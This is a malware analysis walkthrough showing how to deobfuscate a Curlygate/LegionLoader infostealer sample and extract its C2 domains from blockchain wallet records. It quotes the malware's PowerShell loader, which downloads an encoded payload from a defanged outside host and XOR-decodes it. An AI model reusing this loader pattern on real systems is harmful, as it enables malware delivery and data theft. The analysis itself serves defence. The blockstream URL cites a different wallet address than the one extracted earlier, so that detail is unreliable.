
The following walkthrough explains how to deobfuscate a sample of Curlygate, an information-stealing malware, and obtain its DNS/C2 information and blockchain wallet address. Mandiant/Google Cloud refers to the malware as Curlygate, while TEHTRIS refers to it as LegionLoader: https://tehtris.com/en/blog/legionloader-exposed/
Another blog by Zscaler: https://www.zscaler.com/blogs/security-research/black-hat-seo-leveraged-distribute-malware

Please note that this is not intended to be a final product or blog post. It is a simple walkthrough for acquiring IoCs in a sandboxed Linux environment.

The files have already been written to disk on the infected host after the user was lured into downloading and executing a trojanized MSI file.

The following command-line argument is executed after the files are extracted:
```
$w=new-objectSystem.Net.Webclient;$bs=$w.DownloadString("https://two-root[.]com/1207.bs64");
[Byte[]] $x = [Convert]::FromBase64String($bs.Replace("!", "b").Replace("@", "h").Replace("$", "m").Replace("%", "p").Replace("^", "v"));
for($i = 0; $i -lt $x.Count; $i++) {
$x[$i] = ($x[$i] -bxor 167) -bxor 18
};
``` 
Hash details of this sample
```
MD5: 10a944a12bfa915133823ee4f3477374
SHA256: 847369a15980201e483a99c6edb7c24d934bfcc115747db6c1dd57c7bf8f6d2b
```
**Step 1: Deobfuscate the Files (First Stage)**

To decode the Base64 file (1207.bs64), the `b64decoder.py` script takes the Base64 file as input and produces the decoded PowerShell script as output.

Command-line parameter: **python b64decoder.py two_root.mal_ two_root.ps1**

Alternatively, use the following CyberChef recipe to deobfuscate the file:
```
https://gchq.github.io/CyberChef/#recipe=Substitute('!@$%5E%25','bhmvp',false)From_Base64('A-Za-z0-9%2B/%3D',true,false)XOR(%7B'option':'Hex','string':'b5'%7D,'Standard',false)
```

This process results in a multilayered, obfuscated PowerShell script that installs a browser plugin for Brave, Opera, Edge, and Chrome.
Certain parts of the PowerShell script are readable, while the remaining multilayered, obfuscated sections require another deobfuscation method. The script includes a large hash list containing obfuscated JavaScript files that are part of the browser plugin.

**Step 2: Deobfuscate the Hash List (Second Stage)**

This hash list is easy to recognize because of its large block of obfuscated characters, which is assigned to a variable. The variable name is usually six characters long and follows this format: $(A-Za-z0-9).

The next step is to decode the hash list into a deobfuscated script using the `hashlistdecode.py` script. Copy the entire hash list, beginning with "@(<obfuscated characters>)", into an empty text file to use as the script's input. The script may not execute correctly if the complete hash list is not copied.

The deobfuscated hash list contains filenames in the key fields and file contents in the value fields. The keys and values are separated by commas. This step can also be completed in CyberChef, but the large output may cause the application to hang when the results are copied. I created this script to write the extracted files to a specified folder.

Command-line parameter: **python hashlistdecode.py bighash.txt two_root_filelist A two_root_files**

The script also creates a text file (two_root_filelist) listing the paths of all obfuscated JavaScript files.

**Step 3: Deobfuscate the JavaScript (Final Stage)**

To analyze these obfuscated files further, I wrote the `jsdeobfuscator.py` script to convert them into a readable format. The script requires Node.js and the obfuscator.io deobfuscator module to be installed on the analysis machine. It automates the deobfuscation process to make the analysis faster.

Download Node.js from https://nodejs.org/en. It is already installed on many Linux systems.
Download the JavaScript deobfuscator module from https://github.com/ben-sb/obfuscator-io-deobfuscator, or install it with the following command:
```
npm install -g obfuscator-io-deobfuscator
```

The directory path containing the obfuscated files is provided as the script's input parameter.

Command-line parameter: **python jsdeobfuscator.py two_root_files/**

For convenience, each deobfuscated script is saved in the same directory with ".deobfuscated" appended to its filename. For example:
Obfuscated filename: src_functions_domain.js
Deobfuscated filename: src_functions_domain.deobfuscated.js

Alternatively, the files can be processed at https://deobfuscate.io/. However, the script processes all JavaScript files in the directory at once.

**Step 4: Acquire the IoCs**

The primary indicators, including the blockchain wallet address and C2 IoCs, can now be acquired.

These JavaScript files initiate network connections to domains used by common JavaScript applications or services that gather information about the host. It is important to note that these domains are not necessarily directly related to the threat actor.

The deobfuscated domain.js file contains a blockchain wallet address in the following Blockchain URL:
```
https://blockchain[.]info/address/bc1qvmvz53hdauzxuhs7dkm775tlqtd9vpk8ux7mqj?format=json
bc1qvmvz53hdauzxuhs7dkm775tlqtd9vpk8ux7mqj
```

The functions in the domain.js script contact `blockchain[.]info` and decode the response. The C2 domain is stored in Base58 format within the response and is then decoded.

Command-line parameter: **python getc2list.py bc1qvmvz53hdauzxuhs7dkm775tlqtd9vpk8ux7mqj C2list**

This script outputs all decoded domains found in the blockchain wallet's transaction records.

Alternatively, the blockchain address's transaction records can be viewed as JSON by using the following URL:

```
https://blockstream[.]info/api/address/bc1q4fkjqusxsgqzylcagra800cxljal82k6y3ejay/txs
```
The JSON parameter `scriptpubkey_address` holds the encoded domain value. The field "scriptpubkey_type": "p2pkh" (Pay-to-Public-Key-Hash) can also help identify the relevant value. The value can then be decoded using CyberChef's From Base58 recipe.
